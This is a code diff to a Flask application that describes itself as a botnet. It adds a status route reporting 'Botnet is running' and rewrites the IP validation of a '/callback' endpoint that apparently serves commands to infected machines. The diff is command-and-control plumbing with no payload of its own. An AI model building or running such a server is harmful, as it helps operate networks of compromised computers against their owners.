@@ -7,6 +7,11 @@ TODO: Implement these functions
 from flask import request, render_template, jsonify
 from . import app
 
+@app.route("/")
+@app.route("/status")
+def status():
+    return jsonify({"status": "Botnet is running"})
+
 @app.route("/callback", methods=["GET", 'PUT'])
 def get_commands():
     """Expects a JSON object of the following format:
@@ -42,13 +47,8 @@ def get_commands():
             raise ValueError("'ip' not specified")
         
         # Validate that they arent faking the ips
-        if request.headers.getlist("X-Forwarded-For"):
-            real_ip = request.headers.getlist("X-Forwarded-For")[0]
-        else:
-            real_ip = request.remote_addr
-        
-        if real_ip != ip:
-            raise ValueError("specified ip does not match incoming request ip '{}'".format(real_ip))
+        if ip not in request.access_route:  
+            raise ValueError("specified ip does not match incoming request ip '{}'".format(request.remote_addr))
 
         user = data.get("user", False)
         if not user:
